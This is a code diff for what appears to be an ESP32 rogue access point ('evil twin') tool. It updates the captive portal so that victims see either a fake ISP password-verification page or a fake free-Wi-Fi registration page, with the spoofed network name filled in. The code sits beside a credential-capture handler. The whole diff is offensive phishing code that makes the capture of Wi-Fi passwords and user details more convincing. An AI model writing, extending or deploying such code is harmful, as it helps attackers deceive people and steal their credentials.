@@ -3,12 +3,26 @@
 #include "config.h"
 #include "generated_htmls.h"
 
-String buildCaptivePortalPage(const AttackProfile& config) {
+String buildCaptivePortalPage(const AttackProfile& config, bool hasPassword, const String& ssid) {
     if (config.useCustomHtml && !config.customHtmlFile.isEmpty()) {
         String custom = loadHtmlTemplate(config.customHtmlFile);
-        if (!custom.isEmpty()) return custom;
+        if (!custom.isEmpty()) {
+            String result = custom;
+            result.replace("%SSID%", ssid);
+            return result;
+        }
     }
-    return String(FPSTR(CAPTIVE_PORTAL_HTML));
+
+    const char* templateHtml;
+    if (hasPassword) {
+        templateHtml = ZON_ISP_VERIFY_HTML;
+    } else {
+        templateHtml = FREE_WIFI_REGISTER_HTML;
+    }
+
+    String result = String(templateHtml);
+    result.replace("%SSID%", ssid);
+    return result;
 }
 
 void processCredentialCapture(WebServer& server, const String& currentRogueSsid) {
@@ -42,7 +56,7 @@ void sendSuccessRedirect(WebServer& server) {
     server.send(200, "text/html", html);
 }
 
-void serveCaptivePortal(WebServer& server, bool isRogueApRunning) {
+void serveCaptivePortal(WebServer& server, bool isRogueApRunning, bool hasPassword, const String& ssid) {
     if (!isRogueApRunning) {
         server.sendHeader("Location", "/admin");
         server.send(302, "text/plain", "");
@@ -64,5 +78,5 @@ void serveCaptivePortal(WebServer& server, bool isRogueApRunning) {
     server.sendHeader("Expires", "-1");
 
     extern AttackProfile attackConfig;
-    server.send(200, "text/html", buildCaptivePortalPage(attackConfig));
+    server.send(200, "text/html", buildCaptivePortalPage(attackConfig, hasPassword, ssid));
 }
